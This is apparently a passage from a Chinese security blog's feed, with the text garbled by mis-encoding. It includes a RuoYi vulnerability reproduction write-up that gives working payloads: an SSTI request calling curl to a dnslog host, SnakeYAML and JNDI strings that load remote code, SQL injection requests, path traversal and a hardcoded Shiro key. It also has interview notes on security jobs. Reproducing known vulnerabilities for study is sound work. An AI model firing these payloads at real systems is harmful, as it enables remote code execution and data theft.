èµ„æ–™ï¼Œåˆ©ç”¨æ–¹æ³•å’ŒæŠ€å·§åˆé›†ï¼Œé»‘ç›’å®‰å…¨è¯„ä¼° check list</a></p><p><a href="https://xz.aliyun.com/t/9763">https://xz.aliyun.com/t/9763</a></p>]]></content>
      
      
      <categories>
          
          <category> æ¼æ´å¤ç° </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>SpringBootä»£å®¡--é¡¹ç›®ç»“æ„</title>
      <link href="/2023/06/22/SpringBoot%E4%BB%A3%E5%AE%A1--%E9%A1%B9%E7%9B%AE%E7%BB%93%E6%9E%84/"/>
      <url>/2023/06/22/SpringBoot%E4%BB%A3%E5%AE%A1--%E9%A1%B9%E7%9B%AE%E7%BB%93%E6%9E%84/</url>
      
        <content type="html"><![CDATA[<h1 id="Spring-Booté¡¹ç›®ç»“æ„"><a href="#Spring-Booté¡¹ç›®ç»“æ„" class="headerlink" title="Spring Booté¡¹ç›®ç»“æ„"></a>Spring Booté¡¹ç›®ç»“æ„</h1><p>SpringBoot</p>]]></content>
      
      
      <categories>
          
          <category> JAVA </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>è‹¥ä¾æ¼æ´</title>
      <link href="/2023/06/21/%E8%8B%A5%E4%BE%9D%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
      <url>/2023/06/21/%E8%8B%A5%E4%BE%9D%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="RuoYiä»‹ç»"><a href="#RuoYiä»‹ç»" class="headerlink" title="RuoYiä»‹ç»"></a>RuoYiä»‹ç»</h2><p><a href="http://ruoyi.vip/">http://ruoyi.vip/</a></p><p>åŸºäº<strong>SpringBoot</strong>çš„æƒé™ç®¡ç†ç³»ç»Ÿ æ˜“è¯»æ˜“æ‡‚ã€ç•Œé¢ç®€æ´ç¾è§‚ã€‚ æ ¸å¿ƒæŠ€æœ¯é‡‡ç”¨<strong>Springã€MyBatisã€Shiro</strong>æ²¡æœ‰ä»»ä½•å…¶å®ƒé‡åº¦ä¾èµ–ã€‚</p><blockquote><p>è‹¥ä¾çš„ä½œè€…å°†Spring Securityæ›¿æ¢ä¸ºshiro</p></blockquote><h2 id="RuoYiæ¼æ´æ¦‚è§ˆ"><a href="#RuoYiæ¼æ´æ¦‚è§ˆ" class="headerlink" title="RuoYiæ¼æ´æ¦‚è§ˆ"></a>RuoYiæ¼æ´æ¦‚è§ˆ</h2><p>å®˜æ–¹å¯¹å†å²æ¼æ´è¿›è¡Œäº†ç›¸å…³æ•´ç†ï¼š<a href="https://doc.ruoyi.vip/ruoyi/document/kslj.html#%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E">https://doc.ruoyi.vip/ruoyi/document/kslj.html#%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E</a></p><table><thead><tr><th>æ¼æ´åç§°</th><th>è®¿é—®è·¯å¾„</th><th>ç‰ˆæœ¬</th></tr></thead><tbody><tr><td>Thymeleaf SSTI</td><td><code>/monitor/cache/getNames</code></td><td>&lt;&#x3D; v4.7.1</td></tr><tr><td>å®šæ—¶è®¡åˆ’åå°„RCE</td><td><code>ç³»ç»Ÿç›‘æ§â€”&gt;å®šæ—¶ä»»åŠ¡â€”&gt;æ·»åŠ ä»»åŠ¡-&gt;è°ƒç”¨ç›®æ ‡å­—ç¬¦ä¸²</code></td><td>&lt;&#x3D; v4.6.2</td></tr><tr><td>SQLæ³¨å…¥</td><td><code>/system/role/list</code>ã€<code>/system/dept/edit</code></td><td>&lt;&#x3D; 4.6.1</td></tr><tr><td>ä»»æ„æ–‡ä»¶ä¸‹è½½</td><td><code>/common/download/resource</code></td><td>&lt;&#x3D; v4.5.0</td></tr><tr><td>Fastjson RCE</td><td><code>/tool/gen/edit</code></td><td>&lt;&#x3D; v4.2.0</td></tr></tbody></table><p>é»˜è®¤å£ä»¤ï¼šadmin&#x2F;admin123</p><h2 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h2><ul><li><p>hunter</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">web.body=&quot;/ruoyi/css/ry-ui.css?v=ç‰ˆæœ¬å·&quot;</span><br></pre></td></tr></table></figure></li><li><p>æœ¬åœ°æ­å»º</p><p>ä¸‹è½½ï¼š<a href="https://gitee.com/y_project/RuoYi">https://gitee.com/y_project/RuoYi</a></p><p>IDEAè¿æ¥æ•°æ®åº“</p><p><img src="/../images/image-20230621190329600.png" alt="image-20230621190329600"></p><p>å‰©ä¸‹æ­¥éª¤</p><p>ä¿®æ”¹é…ç½®æ–‡ä»¶<code>RuoYi-Vue/ruoyi-admin/src/main/resources/logback.xml</code>ä¸­çš„æ•°æ®åº“è´¦å·å’Œå¯†ç </p><p><a href="https://juejin.cn/post/7081625556705345573">RuoYiæ­å»ºå¼€å‘ç¯å¢ƒ - æ˜é‡‘</a></p></li></ul><h2 id="Thymeleaf-SSTI"><a href="#Thymeleaf-SSTI" class="headerlink" title="Thymeleaf SSTI"></a>Thymeleaf SSTI</h2><p>æœ¬è´¨ä¸Šè¿˜æ˜¯SPELè¡¨è¾¾å¼æ³¨å…¥<a href="https://xz.aliyun.com/t/10514#toc-9">Thymeleaf SSTIæ¼æ´åˆ†æ - å…ˆçŸ¥ç¤¾åŒº (aliyun.com)</a></p><h3 id="å¤ç°"><a href="#å¤ç°" class="headerlink" title="å¤ç°"></a>å¤ç°</h3><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/monitor/cache/getNames</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"></span><br><span class="line"><span class="language-apache"><span class="attribute">fragment</span>=__<span class="variable">$&#123;T<span class="number">%20</span>(java.lang.Runtime).getRuntime().exec(&#x27;curl<span class="number">%20</span>cn0165.dnslog.cn&#x27;)&#125;</span>__::.x</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230825151844044.png" alt="image-20230825151844044"></p><p><img src="/../images/image-20230825151819003.png" alt="image-20230825151819003"></p><h3 id="ç»•è¿‡å§¿åŠ¿"><a href="#ç»•è¿‡å§¿åŠ¿" class="headerlink" title="ç»•è¿‡å§¿åŠ¿"></a>ç»•è¿‡å§¿åŠ¿</h3><p><a href="https://xz.aliyun.com/t/11509#toc-3">è®°ä¸€æ¬¡å®æˆ˜ä¹‹è‹¥ä¾SSTIæ³¨å…¥ç»•è¿‡ç„æŸç›¾ - å…ˆçŸ¥ç¤¾åŒº</a></p><h2 id="åå°å®šæ—¶ä»»åŠ¡â€“YAMLååºåˆ—åŒ–"><a href="#åå°å®šæ—¶ä»»åŠ¡â€“YAMLååºåˆ—åŒ–" class="headerlink" title="åå°å®šæ—¶ä»»åŠ¡â€“YAMLååºåˆ—åŒ–"></a>åå°å®šæ—¶ä»»åŠ¡â€“YAMLååºåˆ—åŒ–</h2><p><a href="https://www.cnblogs.com/nice0e3/p/14514882.html">Javaå®‰å…¨ä¹‹SnakeYamlååºåˆ—åŒ–åˆ†æ - nice_0e3 - åšå®¢å›­ (cnblogs.com)</a></p><h3 id="å¤ç°-1"><a href="#å¤ç°-1" class="headerlink" title="å¤ç°"></a>å¤ç°</h3><p>é»˜è®¤å¯†ç ä¸ºadmin&#x2F;admin123</p><p>è¿›å…¥åå°ç³»ç»Ÿç›‘æ§ä¸‹çš„å®šæ—¶ä»»åŠ¡åŠŸèƒ½ï¼Œå¯ä»¥å‘ç°è°ƒç”¨ç›®æ ‡å­—ç¬¦ä¸²çš„å­—æ®µã€‚</p><p><img src="/../images/image-20230621192434476.png" alt="image-20230621192434476"></p><h4 id="ç”Ÿæˆyamlæ¶æ„jaråŒ…"><a href="#ç”Ÿæˆyamlæ¶æ„jaråŒ…" class="headerlink" title="ç”Ÿæˆyamlæ¶æ„jaråŒ…"></a>ç”Ÿæˆyamlæ¶æ„jaråŒ…</h4><p><a href="https://github.com/artsploit/yaml-payload">https://github.com/artsploit/yaml-payload</a></p><p>ä¿®æ”¹é¡¹ç›®æºç æ–‡ä»¶ src&#x2F;artsploit&#x2F;AwesomeScriptEngineFactory.java </p><p><img src="/../images/image-20230621210916844.png" alt="image-20230621210916844"></p><p>åœ¨ideaä¸­æ‰“å¼€ç»ˆç«¯</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">æ‰“åŒ…ä¸ºjaråŒ…</span></span><br><span class="line">javac src/artsploit/AwesomeScriptEngineFactory.java</span><br><span class="line">jar -cvf yaml-payload.jar -C src/ .</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">å¼€å¯httpæœåŠ¡</span></span><br><span class="line">python -m http.server 1234</span><br></pre></td></tr></table></figure><h4 id="åˆ›å»ºå¹¶å¼€å¯å®šæ—¶ä»»åŠ¡"><a href="#åˆ›å»ºå¹¶å¼€å¯å®šæ—¶ä»»åŠ¡" class="headerlink" title="åˆ›å»ºå¹¶å¼€å¯å®šæ—¶ä»»åŠ¡"></a>åˆ›å»ºå¹¶å¼€å¯å®šæ—¶ä»»åŠ¡</h4><p><img src="/../images/image-20230825143833628.png" alt="image-20230825143833628"></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">org.yaml.snakeyaml.Yaml.load(<span class="string">&#x27;!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [&quot;http://ip:port/yaml-payload.jar&quot;]]]]&#x27;</span>)</span><br><span class="line"></span><br><span class="line">org.springframework.jndi.JndiLocatorDelegate.lookup(<span class="string">&#x27;rmi://ip:port/Evil&#x27;</span>)</span><br><span class="line"></span><br><span class="line">javax.naming.InitialContext.lookup(<span class="string">&#x27;ldap://ip:port/#Evil&#x27;</span>)</span><br></pre></td></tr></table></figure><h4 id="ç»“æœ"><a href="#ç»“æœ" class="headerlink" title="ç»“æœ"></a>ç»“æœ</h4><p><img src="/../images/image-20230621210823778.png" alt="image-20230621210823778"></p><p><img src="/../images/image-20230621210844522.png" alt="image-20230621210844522"></p><h3 id="ç»•è¿‡å§¿åŠ¿-1"><a href="#ç»•è¿‡å§¿åŠ¿-1" class="headerlink" title="ç»•è¿‡å§¿åŠ¿"></a>ç»•è¿‡å§¿åŠ¿</h3><p><a href="https://xz.aliyun.com/t/10957#toc-0">æŸä¾rceé»‘åå•å¤šç§bypassæ–¹æ³•åˆ†æ - å…ˆçŸ¥ç¤¾åŒº</a></p><p><a href="https://xz.aliyun.com/t/11336#toc-0">å®šæ—¶ä»»åŠ¡åŠŸèƒ½ç‚¹ç»•è¿‡é»‘ç™½åå•æ‰§è¡Œä»»æ„sqlè¯­å¥ - å…ˆçŸ¥ç¤¾åŒº</a></p><h2 id="åå°SqlæŠ¥é”™æ³¨å…¥"><a href="#åå°SqlæŠ¥é”™æ³¨å…¥" class="headerlink" title="åå°SqlæŠ¥é”™æ³¨å…¥"></a>åå°SqlæŠ¥é”™æ³¨å…¥</h2><h3 id="å¤ç°-2"><a href="#å¤ç°-2" class="headerlink" title="å¤ç°"></a>å¤ç°</h3><p>åˆ†æ<a href="https://tttang.com/archive/1712/#toc_0x2-ruoyi-461-sql">https://tttang.com/archive/1712/#toc_0x2-ruoyi-461-sql</a></p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/system/role/list</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"></span><br><span class="line"><span class="language-stylus">params<span class="selector-attr">[dataScope]</span>=and <span class="built_in">extractvalue</span>(<span class="number">1</span>,<span class="built_in">concat</span>(<span class="number">0</span>x7e,(select <span class="built_in">user</span>()),<span class="number">0</span>x7e))</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230621195248659.png" alt="image-20230621195248659"></p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/system/dept/edit</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"></span><br><span class="line"><span class="language-apache"><span class="attribute">DeptName</span>=<span class="number">1</span>&amp;DeptId=<span class="number">100</span>&amp;ParentId=<span class="number">12</span>&amp;Status=<span class="number">0</span>&amp;OrderNum=<span class="number">1</span>&amp;ancestors=<span class="number">0</span>)or(extractvalue(<span class="number">1</span>,concat((select user()))));#</span></span><br></pre></td></tr></table></figure><h2 id="shiroååºåˆ—åŒ–"><a href="#shiroååºåˆ—åŒ–" class="headerlink" title="shiroååºåˆ—åŒ–"></a>shiroååºåˆ—åŒ–</h2><p>å‰é¢æåˆ°äº†è‹¥ä¾çš„æ ¸å¿ƒæŠ€æœ¯é‡‡ç”¨<strong>Shiro</strong>ï¼Œå¦‚æœå¯†é’¥æ³„éœ²äº†ï¼Œè‡ªç„¶å°±å­˜åœ¨shiroååºåˆ—åŒ–æ¼æ´ã€‚</p><p>é»˜è®¤æ˜¯åŠ¨æ€ç”Ÿæˆå¯†é’¥ï¼Œå›ºå®šå¯†é’¥å¯ä»¥åœ¨<code>application.yml</code>ä¸­é…ç½®<code>shiro.cookie.cipherKey</code></p><p><img src="/../images/image-20230621193653154.png" alt="image-20230621193653154"></p><p>V4.3.1~V4.6.1ï¼ŒcipherKeyä½¿ç”¨ç¡¬ç¼–ç zSyK5Kp6PZAAjlT+eeNMlg&#x3D;&#x3D;</p><p><img src="/../images/image-20230621203731261.png" alt="image-20230621203731261"></p><h3 id="å¤ç°-3"><a href="#å¤ç°-3" class="headerlink" title="å¤ç°"></a>å¤ç°</h3><p><img src="/../images/image-20230621202753098.png" alt="image-20230621202753098"></p><h2 id="åå°ä»»æ„æ–‡ä»¶ä¸‹è½½"><a href="#åå°ä»»æ„æ–‡ä»¶ä¸‹è½½" class="headerlink" title="åå°ä»»æ„æ–‡ä»¶ä¸‹è½½"></a>åå°ä»»æ„æ–‡ä»¶ä¸‹è½½</h2><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">/common/download/resource?resource=/profile/../pom.xml</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230825145931666.png" alt="image-20230825145931666"></p><h2 id="åˆ©ç”¨å·¥å…·"><a href="#åˆ©ç”¨å·¥å…·" class="headerlink" title="åˆ©ç”¨å·¥å…·"></a>åˆ©ç”¨å·¥å…·</h2><p><img src="/../images/image-20230917181756487.png" alt="image-20230917181756487"></p>]]></content>
      
      
      <categories>
          
          <category> æ¼æ´å¤ç° </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ç¬”/é¢è®°å½•</title>
      <link href="/2023/06/21/%E9%9D%A2%E8%AF%95%E8%AE%B0%E5%BD%95/"/>
      <url>/2023/06/21/%E9%9D%A2%E8%AF%95%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h1 id="HWé¢è¯•"><a href="#HWé¢è¯•" class="headerlink" title="HWé¢è¯•"></a>HWé¢è¯•</h1><blockquote><p>å¤§æ¦‚æ˜¯ä¸‰æ¬¡é¢è¯•çš„é›†åˆå»äº†é‡çš„ï¼Œç»“æœè¿˜æ˜¯å»äº†å®ä¹ </p></blockquote><ul><li><p>è‡ªæˆ‘ä»‹ç»</p></li><li><p>ä¹‹å‰æŠ¤ç½‘ä¸»è¦åšä»€ä¹ˆ</p></li><li><p>è®¾å¤‡ä½¿ç”¨</p><p>ç”¨è¿‡å“ªäº›å®‰å…¨è®¾å¤‡ï¼Œå…·ä½“äº§å•†ï¼Œå…·ä½“æ€ä¹ˆç”¨ï¼ˆè¯­æ³•æ˜¯ä»€ä¹ˆï¼‰</p></li><li><p>è´Ÿè´£å¤–ç½‘è¿˜æ˜¯å†…ç½‘ï¼Œæœ‰å¾ˆå¤šè¯¯æŠ¥æ€ä¹ˆåŠ</p></li><li><p>å¦‚ä½•åˆ¤æ–­æ”»å‡»æˆåŠŸ</p></li><li><p>sqlæ³¨å…¥ç›¸å…³</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlæ³¨å…¥åŸç†ï¼Œæ–¹å¼ï¼Œé˜²å¾¡æ‰‹æ®µ</span><br><span class="line">å®½å­—èŠ‚æ³¨å…¥åŸç†</span><br><span class="line">sqlå†™shellçš„æ¡ä»¶ï¼Œå…·ä½“çš„è¯­å¥ï¼ˆè¿½é—®ï¼šé™¤äº†ç›´æ¥å†™å…¥è¿˜æœ‰å…¶ä»–æ–¹æ³•å—)</span><br><span class="line">sqlmapå†™shellçš„å‚æ•°å’ŒåŸç†</span><br><span class="line">ä½¿ç”¨sqlmap postæ³¨å…¥çš„å‚æ•°</span><br><span class="line">sqlæ³¨å…¥ç»•è¿‡wafçš„æ–¹å¼</span><br><span class="line">sqlæ³¨å…¥å»¶æ—¶æ³¨å…¥æ—¶ï¼Œsleepå‡½æ•°è¢«ç¦ç”¨äº†æ€ä¹ˆåŠ</span><br></pre></td></tr></table></figure></li><li><p>æ¸—é€æµ‹è¯•æµç¨‹ä»ä¿¡æ¯æ”¶é›†å¼€å§‹å®Œæ•´åœ°è®²è®²</p></li><li><p>xxeæœ‰å“ªäº›åˆ©ç”¨æ–¹å¼</p></li><li><p>ç»™ä½ ä¸€ä¸ªåœºæ™¯ï¼Œthinkphpï¼Œå¯ä»¥æ–‡ä»¶ä¸Šä¼ ï¼Œä½†æ˜¯æœ‰ç™½åå•åªèƒ½ä¸Šä¼ å›¾ç‰‡ï¼Œæ€ä¹ˆrce</p></li><li><p>äº†è§£è¿‡burpçš„dnsåŠŸèƒ½å—</p><p>è¿½é—®ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">çœ‹è¿‡dnslogæ—¥å¿—å—</span><br></pre></td></tr></table></figure></li><li><p>è®²ä¸€ä¸‹æŒ–çŸ¿æœ¨é©¬çš„å¤„ç½®</p><p>è¿½é—®ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">è¦ç”¨ä»€ä¹ˆå‘½ä»¤å®šä½è¿›ç¨‹æ‰€å¯¹åº”çš„å¯æ‰§è¡Œæ–‡ä»¶</span><br><span class="line">æ–°å¢ç”¨æˆ·æ€ä¹ˆæ’æŸ¥ï¼ˆwindowså’Œlinuxï¼‰</span><br><span class="line">ç”¨ä»€ä¹ˆå‘½ä»¤æ’æŸ¥linuxçš„ç‰¹æƒç”¨æˆ· </span><br><span class="line">ä¸€ç›´æ€ä¸æ‰æ€ä¹ˆåŠï¼ˆè¦çœ‹å“ªäº›æ–‡ä»¶/ç›®å½•ï¼‰</span><br></pre></td></tr></table></figure></li><li><p>javaå†…å­˜é©¬ç±»å‹</p><p>è¿½é—®ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">å„è‡ªåŸç†</span><br><span class="line">å†°èçš„æœ¨é©¬åŸç†äº†è§£è¿‡å—</span><br></pre></td></tr></table></figure></li><li><p>æ¸—é€ä¸­å¦‚æœæœºå™¨ä¸å‡ºç½‘æ€ä¹ˆåŠ</p><p>è¿½é—®</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ç”¨çš„ä»€ä¹ˆåå‘ä»£ç†</span><br></pre></td></tr></table></figure></li><li><p>å¦‚æœå¯ä»¥rceï¼Œä½†æ˜¯æ— å›æ˜¾å¹¶ä¸”ä¸å‡ºç½‘æ€ä¹ˆåŠ</p></li><li><p>å¦‚æœæœºå­è¢«ä¸Šäº†csæœ¨é©¬ï¼Œæ€ä¹ˆæ£€æµ‹å‡ºæœ¨é©¬è¿›ç¨‹</p></li><li><p>wiresharkç”¨è¿‡å—</p></li><li><p>å‡è®¾ä¸Šä¼ äº†webshellï¼Œæ”»å‡»è€…ä¼šä½¿ç”¨webshellç®¡ç†å·¥å…·è¿›è¡Œè¿æ¥ï¼Œè®²ä¸€ä¸‹è¿™äº›ç®¡ç†å·¥å…·çš„æµé‡ç‰¹å¾</p></li><li><p>è®²ä¸€ä¸‹javaçš„shiroï¼Œlog4jç­‰æ¼æ´</p></li><li><p>æœ‰åšè¿‡æº¯æºå—ï¼Œäº†è§£çš„è¯´è¯´</p></li><li><p>ç®€å†ä¸Šè¯´æŒ–æ˜è¿‡é€»è¾‘æ¼æ´ï¼Œç°åœ¨ç»™ä½ ä¸€ä¸ªç™»å½•æ¡†ï¼Œä½ æœ‰ä»€ä¹ˆæ€è·¯</p></li><li><p>å‡è®¾æœ‰ä¸€ä¸ªå­˜å‚¨å‹xssï¼Œæ€ä¹ˆè¿›è¡ŒæŒä¹…åŒ–</p></li><li><p>å¦‚æœé€šçŸ¥æœºå™¨ä¸Šå‡ºç°äº†ä¸€äº›å¯ç–‘çš„æ–‡ä»¶å’Œç›®å½•ï¼Œæ€ä¹ˆè¿›è¡Œåº”æ€¥å“åº”</p></li><li><p>è®²ä¸€ä¸‹æ–‡ä»¶ä¸Šä¼ é»‘ç™½åå•ç»•è¿‡</p><p>è¿½é—®</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ä¸­é—´ä»¶è§£ææ¼æ´è®²è®²</span><br></pre></td></tr></table></figure></li><li><p>ä¸»æœºåŸºçº¿è§„èŒƒè®²ä¸€ä¸‹</p></li><li><p>å¦‚æœæŠ¤ç½‘æœŸé—´å‡ºç°äº†0dayè¯¥æ€ä¹ˆåŠ</p></li><li><p>è®²ä¸€ä¸‹å†…ç½‘ä¸­çš„ç¥¨æ®</p></li><li><p>windowsäº‹ä»¶çŠ¶æ€ç </p></li></ul><h1 id="æ¸—é€æµ‹è¯•å®ä¹ "><a href="#æ¸—é€æµ‹è¯•å®ä¹ " class="headerlink" title="æ¸—é€æµ‹è¯•å®ä¹ "></a>æ¸—é€æµ‹è¯•å®ä¹ </h1><ul><li>è‡ªæˆ‘ä»‹ç»</li><li>è®²ä¸€ä¸‹ååºåˆ—åŒ–æ¼æ´</li><li>dnslogäº†è§£å—ï¼Œæ˜¯åœ¨å‘½ä»¤æœ‰å›æ˜¾è¿˜æ˜¯æ— å›æ˜¾çš„æ—¶å€™ç”¨</li><li>dnslogå’Œåå¼¹shellæœ‰ä»€ä¹ˆåŒºåˆ«</li><li>ä¸€å¥è¯æœ¨é©¬å’Œå†…å­˜é©¬æœ‰ä»€ä¹ˆåŒºåˆ«</li><li>å¸¸è§çš„wafç»•è¿‡æ–¹å¼</li><li>æ–‡ä»¶ä¸Šä¼ è®²è®²</li><li>é€»è¾‘æ¼æ´çŸ¥é“å“ªäº›</li><li>æœªæˆæƒè®¿é—®æ¼æ´ä½ æ˜¯æ€ä¹ˆæŒ–åˆ°çš„</li><li>sqlæ³¨å…¥ä½ ä¼šç”¨åˆ°å“ªäº›å‡½æ•°</li><li>springæ¡†æ¶æ¼æ´</li><li>é˜¿é‡Œçš„druidäº†è§£å—</li><li>dockerå®¹å™¨æ¼æ´ï¼Œåœ¨å®æˆ˜ä¸­æœ‰é‡è§è¿‡å—</li><li>weblogicæ¡†æ¶æ¼æ´</li><li>çŸ¥é“å“ªäº›CMS</li><li>è‹¥ä¾CMSæ¼æ´çŸ¥é“å—</li><li>2022å¹´ä»¥åçš„æ¼æ´çŸ¥é“å“ªäº›</li><li>ä½ äº†è§£æˆ‘ä»¬å…¬å¸å—</li><li>ä½ æ€ä¹ˆçœ‹å¾…åŠ ç­</li></ul><h1 id="ä¿¡æ¯å®‰å…¨å·¥ç¨‹å¸ˆç¬”è¯•"><a href="#ä¿¡æ¯å®‰å…¨å·¥ç¨‹å¸ˆç¬”è¯•" class="headerlink" title="ä¿¡æ¯å®‰å…¨å·¥ç¨‹å¸ˆç¬”è¯•"></a>ä¿¡æ¯å®‰å…¨å·¥ç¨‹å¸ˆç¬”è¯•</h1><p>æŸæ¸¸æˆå‚ï¼Œç»å¤§éƒ¨åˆ†éƒ½æ˜¯æ•°æ®ç»“æ„ï¼Œæ¦‚ç‡ç»Ÿè®¡ï¼Œç®—æ³•ï¼Ÿï¼Ÿï¼Ÿ</p><h1 id="Webå®‰å…¨å·¥ç¨‹å¸ˆç¬”è¯•"><a href="#Webå®‰å…¨å·¥ç¨‹å¸ˆç¬”è¯•" class="headerlink" title="Webå®‰å…¨å·¥ç¨‹å¸ˆç¬”è¯•"></a>Webå®‰å…¨å·¥ç¨‹å¸ˆç¬”è¯•</h1><ul><li><p>â€œ&#96;â€ç¬¦å·ï¼ˆåå•å¼•å·ï¼‰åœ¨PHPè¯­è¨€ä»¥åŠSQLè¯­è¨€ä¸­çš„ä½œç”¨åˆ†åˆ«æ˜¯ä»€ä¹ˆ</p></li><li><p>Pythonè¯­å¥â€™intâ€™.__class__çš„å«ä¹‰æ˜¯ä»€ä¹ˆï¼Œè¯¥è¯­å¥å’Œä»€ä¹ˆæ¼æ´æœ‰å…³</p></li><li><p>Javaä¸­çš„åå°„æœ‰ä»€ä¹ˆä½œç”¨</p></li><li><p>Javaååºåˆ—åŒ–çš„åŸºæœ¬åŸç†</p></li><li><p>SSRFæ¼æ´æœ‰ä»€ä¹ˆæ¼æ´åˆ©ç”¨æ€è·¯ï¼Ÿ</p></li><li><p>åˆ©ç”¨XSSæ¼æ´å¯ä»¥è¾¾åˆ°ä»€ä¹ˆæ•ˆæœï¼Ÿæœ‰å“ªäº›é˜²å¾¡XSSæ¼æ´çš„æ‰‹æ®µ&#x2F;æœºåˆ¶ï¼Ÿ</p></li><li><p>è”åˆæŸ¥è¯¢æ³¨å…¥å¦‚ä½•åˆ¤æ–­è¡¨ä¸­åˆ—çš„æ•°é‡ï¼ˆé™¤äº†ä½¿ç”¨order byï¼‰</p></li><li><p>æè¿°ä¸€ä¸‹SQLäºŒæ¬¡æ³¨å…¥æ¼æ´çš„åŸç†</p></li><li><p>æè¿°ä¸€ä¸‹PHPååºåˆ—åŒ–æ¼æ´çš„åŸç†</p></li><li><p>JWTæ˜¯ä»€ä¹ˆï¼›Cookieå’ŒSessionçš„åŒºåˆ«æ˜¯ä»€ä¹ˆ</p></li><li><p>æè¿°ä¸€ä¸‹Shiro550æ¼æ´çš„åŸç†</p></li><li><p>sqlmap â€“os-shellå‚æ•°åˆ†åˆ«åœ¨é¢å¯¹MySQLå’ŒMSSQLæ•°æ®åº“ä¸­æ‰§è¡Œçš„åŸç†</p></li><li><p>sqlmapä¸­â€“techniqueå’Œâ€“dbmså‚æ•°çš„å«ä¹‰æ˜¯ä»€ä¹ˆ</p></li><li><p>nmapä½¿ç”¨å“ªä¸ªå‚æ•°å¯ä»¥åšåˆ°å¯¹ç›®æ ‡åªæ¢æµ‹å­˜æ´»ï¼Œä½†ä¸è¿›è¡Œç«¯å£æ‰«æ</p></li><li><p>22ã€1433ã€1521ã€2375ã€3306ã€3389ã€6379ã€7001ç«¯å£å¯¹åº”çš„æœåŠ¡åç§°åˆ†åˆ«æ˜¯ä»€ä¹ˆ</p></li><li><p>æè¿°ä¸€ä¸‹Redisæœªæˆæƒè®¿é—®æ¼æ´çš„åˆ©ç”¨æ–¹å¼</p></li><li><p>æƒ³é€šè¿‡SQLæ³¨å…¥æ¼æ´å†™shellï¼ˆè¢«æ”»å‡»ç›®æ ‡æ˜¯MySQLã€Apacheã€PHPï¼‰ï¼Œéœ€è¦è¢«æ”»å‡»æ–¹æ»¡è¶³ä»€ä¹ˆæ¡ä»¶ï¼ŸMySQLä¸­ï¼Œå¯ä»¥å†™å…¥æ–‡ä»¶çš„ä¸¤æ¡æŒ‡ä»¤åˆ†åˆ«æ˜¯ä»€ä¹ˆï¼Œè¿™ä¸¤æ¡æŒ‡ä»¤çš„åŒºåˆ«æ˜¯ä»€ä¹ˆï¼Ÿ</p></li><li><p>å‡­å°è±¡åˆ—ä¸¾å‡ ä¸ªä¸¾ä¸–é—»åçš„æ¼æ´åç§°åŠå…¶CVEç¼–å·</p></li><li><p>å¯¹äºæ¸—é€ä¸­å¸¸è§çš„ä¸­é—´ä»¶ã€æ¡†æ¶æˆ–ç»„ä»¶ï¼Œä½ ä¼šç”¨ä»€ä¹ˆå·¥å…·å»å¯¹ä»–è¿›è¡Œæ¼æ´æ‰«æï¼Ÿ(å…·ä½“åˆ°ä¸­é—´ä»¶ã€æ¡†æ¶æˆ–ç»„ä»¶åŠå¯¹åº”å·¥å…·çš„åç§°)</p></li><li><p>å¦‚æœå‘ç°äº†ç½‘ç«™æœ‰ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ï¼Œä½ æ¥ä¸‹æ¥æœ‰ä»€ä¹ˆæµ‹è¯•æ€è·¯ï¼Ÿ</p></li><li><p>å¯¹äºé“¾æ¥demo.do?DATA&#x3D;dWlkPTE2&#x3D;&#x3D;ï¼Œä½ æœ‰ä»€ä¹ˆæµ‹è¯•æ€è·¯ï¼Ÿ</p></li><li><p>æ‰«ç›®å½•å‘ç°swagger.jsonï¼Œä½ æœ‰ä»€ä¹ˆæµ‹è¯•æ€è·¯ï¼Ÿ</p></li><li><p>é‡åˆ°åªæœ‰ä¸€ä¸ªç™»å½•æ¡†é¡µé¢çš„ç½‘ç«™ï¼Œä½ æœ‰å“ªäº›æµ‹è¯•æ€è·¯</p></li><li><p>æè¿°å¯¹æ‰‹æœºAppï¼ˆAndroid&#x2F;IOSï¼‰è¿›è¡Œæµ‹è¯•çš„æ€è·¯å’Œåšæ³•</p></li><li><p>å…·ä½“åˆ°å·¥å…·çš„åç§°</p></li><li><p>æè¿°å¯¹å¾®ä¿¡å°ç¨‹åºè¿›è¡Œæµ‹è¯•çš„æ€è·¯å’Œåšæ³•</p></li><li><p>ç»™ä½ å•ä¸ªIPåœ°å€ï¼Œè®©ä½ å¯¹å®ƒè¿›è¡Œå…¨é¢çš„æ¸—é€æµ‹è¯•ï¼Œä½ 